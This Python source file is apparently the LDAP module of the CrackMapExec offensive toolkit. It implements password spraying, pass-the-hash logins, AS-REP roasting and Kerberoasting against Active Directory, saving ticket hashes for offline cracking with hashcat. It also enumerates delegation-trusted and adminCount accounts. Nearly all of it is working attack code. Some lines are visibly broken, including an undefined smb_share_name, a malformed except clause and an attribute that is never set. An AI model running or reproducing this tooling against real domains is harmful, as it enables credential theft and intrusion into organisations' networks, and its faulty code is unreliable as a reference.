# from https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
# https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf

import requests
import logging
import configparser
from cme.connection import *
from cme.helpers.logger import highlight
from cme.logger import CMEAdapter
from cme.protocols.ldap.kerberos import KerberosAttacks
from impacket.smbconnection import SMBConnection, SessionError
from impacket.smb import SMB_DIALECT
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.krb5.kerberosv5 import sendReceive, KerberosError, getKerberosTGT, getKerberosTGS
from impacket.krb5.types import KerberosTime, Principal
from impacket.ldap import ldap as ldap_impacket
from impacket.krb5 import constants
from impacket.ldap import ldapasn1 as ldapasn1_impacket
from io import StringIO

class ldap(connection):

    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.os_arch = 0
        self.hash = None
        self.ldapConnection = None
        self.lmhash = ''
        self.nthash = ''
        self.baseDN = ''
        self.remote_ops = None
        self.bootkey = None
        self.output_filename = None
        self.smbv1 = None
        self.signing = False
        self.smb_share_name = smb_share_name

        connection.__init__(self, args, db, host)

    @staticmethod
    def proto_args(parser, std_parser, module_parser):
        ldap_parser = parser.add_parser('ldap', help="own stuff using ldap", parents=[std_parser, module_parser])
        ldap_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')
        ldap_parser.add_argument("--no-bruteforce", action='store_true', help='No spray when using file for username and password (user1 => password1, user2 => password2')
        ldap_parser.add_argument("--continue-on-success", action='store_true', help="continues authentication attempts even after successes")
        ldap_parser.add_argument("--port", type=int, choices={389, 636}, default=389, help="LDAP port (default: 389)")
        dgroup = ldap_parser.add_mutually_exclusive_group()
        dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', type=str, default=None, help="domain to authenticate to")
        dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')
        
        egroup = ldap_parser.add_argument_group("Retrevie hash on the remote DC", "Options to get hashes from Kerberos")
        egroup.add_argument("--asreproast", help="Get AS_REP response ready to crack with hashcat")
        egroup.add_argument("--kerberoasting", help='Get TGS ticket ready to crack with hashcat')
        
        vgroup = ldap_parser.add_argument_group("Retrieve useful information on the domain", "Options to to play with Kerberos")
        vgroup.add_argument("--trusted-for-delegation", action="store_true", help="Get the list of users and computers with flag TRUSTED_FOR_DELEGATION")
        vgroup.add_argument("--admin-count", action="store_true", help="Get objets that had the value adminCount=1")

        return parser

    def proto_logger(self):
        self.logger = CMEAdapter(extra={
                                        'protocol': 'LDAP',
                                        'host': self.host,
                                        'port': self.args.port,
                                        'hostname': self.hostname
                                        })

    def get_os_arch(self):
        try:
            stringBinding = r'ncacn_ip_tcp:{}[135]'.format(self.host)
            transport = DCERPCTransportFactory(stringBinding)
            transport.set_connect_timeout(5)
            dce = transport.get_dce_rpc()
            if self.args.kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.connect()
            try:
                dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0'))
            except (DCERPCException, e):
                if str(e).find('syntaxes_not_supported') >= 0:
                    dce.disconnect()
                    return 32
            else:
                dce.disconnect()
                return 64

        except Exception as e:
            logging.debug('Error retrieving os arch of {}: {}'.format(self.host, str(e)))

        return 0

    def enum_host_info(self):
        self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]

        try:
            self.conn.login('' , '')
        except:
            #if "STATUS_ACCESS_DENIED" in e:
            pass

        self.domain    = self.conn.getServerDNSDomainName()
        self.hostname  = self.conn.getServerName()
        self.server_os = self.conn.getServerOS()
        self.signing   = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection['RequireSigning']
        self.os_arch   = self.get_os_arch()

        self.output_filename = os.path.expanduser('~/.cme/logs/{}_{}_{}'.format(self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S")))

        if not self.domain:
            self.domain = self.hostname

        try:
            '''plaintext_login
                DC's seem to want us to logoff first, windows workstations sometimes reset the connection
                (go home Windows, you're drunk)
            '''
            self.conn.logoff()
        except:
            pass

        if self.args.domain:
            self.domain = self.args.domain
        
        if self.args.local_auth:
            self.domain = self.hostname

        #Re-connect since we logged off
        self.create_conn_obj()

    def print_host_info(self):
        self.logger.info(u"{}{} (name:{}) (domain:{}) (signing:{}) (SMBv1:{})".format(self.server_os,
                                                                                      ' x{}'.format(self.os_arch) if self.os_arch else '',
                                                                                      self.hostname,
                                                                                      self.domain,
                                                                                      self.signing,
                                                                                      self.smbv1))

    def kerberos_login(self, aesKey, kdcHost):
        # Create the baseDN
        domainParts = self.domain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]

        if self.kdcHost is not None:
            target = self.kdcHost
        else:
            target = self.domain

        try:
            self.ldapConnection.kerberosLogin(self.username, self.password, self.domain, self.lmhash, self.nthash,
                                                self.aesKey, kdcHost=self.kdcHost)                                
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                self.ldapConnection = ldap_impacket.LDAPConnection('ldaps://%s' % target, self.baseDN, self.kdcHost)
                self.ldapConnection.kerberosLogin(self.username, self.password, self.domain, self.lmhash, self.nthash,
                                                self.aesKey, kdcHost=self.kdcHost)

        return True


    def plaintext_login(self, domain, username, password):
        self.username = username
        self.password = password
        self.domain = domain
        # Create the baseDN
        self.baseDN = ''
        domainParts = self.domain.split('.')
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]

        if self.kdcHost is not None:
            target = self.kdcHost
        else:
            target = domain

        if self.password == '' and self.args.asreproast:
            hash_TGT = KerberosAttacks(self).getTGT_asroast(self.username)
            if hash_TGT:
                self.logger.highlight(u'{}'.format(hash_TGT))
                with open(self.args.asreproast, 'a+') as hash_asreproast:
                    hash_asreproast.write(hash_TGT + '\n')
            return False

        # Connect to LDAP
        out = u'{}{}:{}'.format('{}\\'.format(domain),
                                                username,
                                                password)
        try:
            self.ldapConnection = ldap_impacket.LDAPConnection('ldap://%s' % target, self.baseDN, self.kdcHost)
            self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
            self.logger.success(out)
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                try:
                    self.ldapConnection = ldap_impacket.LDAPConnection('ldaps://%s' % target, self.baseDN, self.kdcHost)
                    self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
                    self.logger.success(out)
                except ldap_impacket.LDAPSessionError as e:
                    self.logger.error(u'{}\{}:{}'.format(self.domain, 
                                                            self.username, 
                                                            self.password))
            else:
                self.logger.error(u'{}\{}:{}'.format(self.domain, 
                                                 self.username, 
                                                 self.password))
            return False

        return True

    def hash_login(self, domain, username, ntlm_hash):
        lmhash = ''
        nthash = ''

        #This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash

        self.hash = ntlm_hash
        if lmhash: self.lmhash = lmhash
        if nthash: self.nthash = nthash

        self.username = username
        self.domain = domain
        # Create the baseDN
        self.baseDN = ''
        domainParts = self.domain.split('.')
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]

        if self.kdcHost is not None:
            target = self.kdcHost
        else:
            target = domain

        if self.hash == '' and self.args.asreproast:
            hash_TGT = KerberosAttacks(self).getTGT_asroast(self.username)
            if hash_TGT:
                self.logger.highlight(u'{}'.format(hash_TGT))
                with open(self.args.asreproast, 'a+') as hash_asreproast:
                    hash_asreproast.write(hash_TGT + '\n')
            return False

        # Connect to LDAP
        out = u'{}{}:{}'.format('{}\\'.format(domain),
                                    username,
                                    nthash)
        try:
            self.ldapConnection = ldap_impacket.LDAPConnection('ldap://%s' % target, self.baseDN, self.kdcHost)
            self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)

            self.logger.success(out)
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                try:
                    # We need to try SSL
                    self.ldapConnection = ldap_impacket.LDAPConnection('ldaps://%s' % target, self.baseDN, self.kdcHost)
                    self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
                    self.logger.success(out)
                except ldap_impacket.LDAPSessionError as e:
                    self.logger.error(u'{}\{}:{}'.format(self.domain, 
                                                    self.username, 
                                                    self.nthash))
            else:
                self.logger.error(u'{}\{}:{}'.format(self.domain, 
                                                    self.username, 
                                                    self.nthash))
            return False

        return True

    def create_smbv1_conn(self):
        try:
            self.conn = SMBConnection(self.host, self.host, None, 445, preferredDialect=SMB_DIALECT)
            self.smbv1 = True
        except socket.error as e:
            if str(e).find('Connection reset by peer') != -1:
                logging.debug('SMBv1 might be disabled on {}'.format(self.host))
            return False
        except Exception as e:
            logging.debug('Error creating SMBv1 connection to {}: {}'.format(self.host, e))
            return False

        return True

    def create_smbv3_conn(self):
        try:
            self.conn = SMBConnection(self.host, self.host, None, 445)
            self.smbv1 = False
        except socket.error:
            return False
        except Exception as e:
            logging.debug('Error creating SMBv3 connection to {}: {}'.format(self.host, e))
            return False

        return True

    def create_conn_obj(self):
        if self.create_smbv1_conn():
            return True
        elif self.create_smbv3_conn():
            return True

        return False

    def getUnixTime(self, t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def asreproast(self):
        if self.password == '' and self.nthash == '' and self.kerberos == False:
            return False
        # Building the search filter
        searchFilter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)" \
                    "(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % \
                    (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)

        try:
            logging.debug('Search Filter=%s' % searchFilter)
            resp = self.ldapConnection.search(searchFilter=searchFilter,
                                        attributes=['sAMAccountName',
                                                    'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                        sizeLimit=999)
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
                pass
            else:
                logging.debug(e)
                return False

        answers = []
        logging.debug('Total of records returned %d' % len(resp))

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = "0x%x" % int(attribute['vals'][0])
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                if mustCommit is True:
                    answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
            except Exception as e:
                logging.debug("Exception:", exc_info=True)
                logging.debug('Skipping item, cannot process due to error %s' % str(e))
                pass
        if len(answers)>0:
            for user in answers:
                hash_TGT = KerberosAttacks(self).getTGT_asroast(user[0])
                self.logger.highlight(u'{}'.format(hash_TGT))
                with open(self.args.asreproast, 'a+') as hash_asreproast:
                    hash_asreproast.write(hash_TGT + '\n')
            return True
        else:
            self.logger.error("No entries found!")

    def kerberoasting(self):
        # Building the search filter
        searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)" \
                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"

        try:
            resp = self.ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['servicePrincipalName', 'sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         sizeLimit=999)
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
                pass
            else:
                return False

        answers = []
        logging.debug('Total of records returned %d' % len(resp))

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            SPNs = []
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            delegation = ''
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = str(attribute['vals'][0])
                        if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                            delegation = 'unconstrained'
                        elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                            delegation = 'constrained'
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'servicePrincipalName':
                        for spn in attribute['vals']:
                            SPNs.append(str(spn))

                if mustCommit is True:
                    if int(userAccountControl) & UF_ACCOUNTDISABLE:
                        logging.debug('Bypassing disabled account %s ' % sAMAccountName)
                    else:
                        for spn in SPNs:
                            answers.append([spn, sAMAccountName,memberOf, pwdLastSet, lastLogon, delegation])
            except Exception as e:
                logging.error('Skipping item, cannot process due to error %s' % str(e))
                pass

        if len(answers)>0:
            users = dict( (vals[1], vals[0]) for vals in answers)
            TGT = KerberosAttacks(self).getTGT_kerberoasting()
            for user, SPN in users.items():
                try:
                    serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.domain,
                                                                            self.kdcHost,
                                                                            TGT['KDC_REP'], TGT['cipher'],
                                                                            TGT['sessionKey'])
                    r = KerberosAttacks(self).outputTGS(tgs, oldSessionKey, sessionKey, user, SPN)
                    self.logger.highlight(u'{}'.format(r))
                    with open(self.args.kerberoasting, 'a+') as hash_kerberoasting:
                        hash_kerberoasting.write(r + '\n')
                except Exception as e:
                    logging.debug("Exception:", exc_info=True)
                    logging.error('SPN: %s - %s' % (SPN,str(e)))
        else:
            self.logger.error("No entries found!")

    def trusted_for_delegation(self):
        # Building the search filter
        searchFilter = "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
        try:
            logging.debug('Search Filter=%s' % searchFilter)
            resp = self.ldapConnection.search(searchFilter=searchFilter,
                                        attributes=['sAMAccountName',
                                                    'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                        sizeLimit=999)
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
                pass
            else:
                return False
        answers = []
        logging.debug('Total of records returned %d' % len(resp))

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = "0x%x" % int(attribute['vals'][0])
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                if mustCommit is True:
                    answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
            except Exception as e:
                logging.debug("Exception:", exc_info=True)
                logging.debug('Skipping item, cannot process due to error %s' % str(e))
                pass
        if len(answers)>0:
            logging.debug(answers)
            for value in answers:
                self.logger.highlight(value[0])
        else:
            self.logger.error("No entries found!")
        return

    def admin_count(self):
        # Building the search filter
        searchFilter = "(adminCount=1)"
        try:
            logging.debug('Search Filter=%s' % searchFilter)
            resp = self.ldapConnection.search(searchFilter=searchFilter,
                                        attributes=['sAMAccountName',
                                                    'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                        sizeLimit=999)
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
                pass
            else:
                return False
        answers = []
        logging.debug('Total of records returned %d' % len(resp))

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = "0x%x" % int(attribute['vals'][0])
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                if mustCommit is True:
                    answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
            except Exception as e:
                logging.debug("Exception:", exc_info=True)
                logging.debug('Skipping item, cannot process due to error %s' % str(e))
                pass
        if len(answers)>0:
            logging.debug(answers)
            for value in answers:
                self.logger.highlight(value[0])
        else:
            self.logger.error("No entries found!")
        return        

